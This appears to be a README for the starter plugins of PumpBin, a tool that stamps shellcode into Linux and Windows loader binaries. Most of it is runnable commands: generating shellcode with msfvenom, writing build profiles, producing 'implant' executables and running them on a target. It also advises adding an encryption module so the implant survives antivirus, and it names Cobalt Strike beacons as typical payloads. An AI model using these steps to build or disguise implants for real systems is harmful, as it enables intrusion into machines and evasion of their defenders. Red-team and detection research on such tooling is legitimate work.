# Starter plugins

Two ready-to-use `.b1n` plugin packs to get a new PumpBin user from
zero to a working implant in 30 seconds.

| File         | Target              | Loader technique                              | Size   |
|--------------|---------------------|-----------------------------------------------|--------|
| `linux.b1n`  | ELF, x86_64 Linux   | basic `mmap` + `mprotect` + jmp               | ~220 KB |
| `windows.b1n` | PE32+, x86_64 Win   | `VirtualAlloc` → `VirtualProtect` → `CreateThread` | ~150 KB |

Both are unencrypted, single-stage loaders. They are intentionally
simple — meant for smoke-testing the build pipeline and learning how
PumpBin stamps a `.b1n` against a shellcode, not for operational use
against modern EDR.

## 30-second smoke test (Windows)

```bash
# 1. Generate any shellcode you have lying around.
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o payload.bin

# 2. Write a 10-line profile.
cat > pumpbin.toml <<'EOF'
schema = "pumpbin.profile/v1"

[plugin]
source = "examples/starter-plugins/windows.b1n"

[target]
platform = "windows"
binary_type = "exe"

[shellcode]
source = "file"
path = "payload.bin"

[output]
path = "out/implant.exe"
sbom = true
EOF

# 3. Build.
pumpbin-cli build -f pumpbin.toml

# 4. Ship to a Windows box and run. (Defender will eat this — see
#    "expected detection" below.)
```

## 30-second smoke test (Linux)

```bash
# Tiny sentinel shellcode that writes "PB-QA-OK" to a file then exits.
# Real operators use msfvenom/sliver/donut output here.
cp tests/fixtures/qa/linux_sentinel.bin payload.bin

cat > pumpbin.toml <<'EOF'
schema = "pumpbin.profile/v1"
[plugin]
source = "examples/starter-plugins/linux.b1n"
[target]
platform = "linux"
binary_type = "exe"
[shellcode]
source = "file"
path = "payload.bin"
[output]
path = "out/implant"
EOF

pumpbin-cli build -f pumpbin.toml
chmod +x out/implant
./out/implant && echo "ran cleanly"
```

## Expected detection

These starter plugins are intentionally naïve. The Windows one in
particular will be quarantined by Windows Defender within seconds of
landing on disk for any common payload (Cobalt Strike beacon,
msfvenom, etc.).

To ship something that survives basic AV, compose an encryption
module into the build:

```toml
[shellcode]
source = "file"
path = "payload.bin"

[[modules]]
wasm = "plugin-examples/aes-gcm-encrypt/target/wasm32-wasip1/release/aes_gcm_encrypt.wasm"
```

See `plugin-examples/aes-gcm-encrypt/` for the reference encryption
module and `book/` for the full module-chain documentation.

## Rebuilding the starter plugins

If you change the loader source and want to refresh the `.b1n`:

**Linux:**
```
# linux.b1n is a copy of tests/fixtures/qa/linux_loader.b1n,
# itself a re-package of test/linux_loader_basic.b1n. To build fresh:
pumpbin-cli create-b1n \
    --output examples/starter-plugins/linux.b1n \
    --name "starter-linux" --author pumpbin \
    --template <your-linux-loader-elf> \
    --platform linux --type exe
```

**Windows:**
```
# Pre-req: mingw-w64 toolchain (`apt install gcc-mingw-w64`).
cd <path-to>/rust-shellcode/create_thread_pumpbin
cargo build --release --target x86_64-pc-windows-gnu
pumpbin-cli create-b1n \
    --output examples/starter-plugins/windows.b1n \
    --name "starter-windows" --author pumpbin \
    --template target/x86_64-pc-windows-gnu/release/loader.exe \
    --platform windows --type exe
```
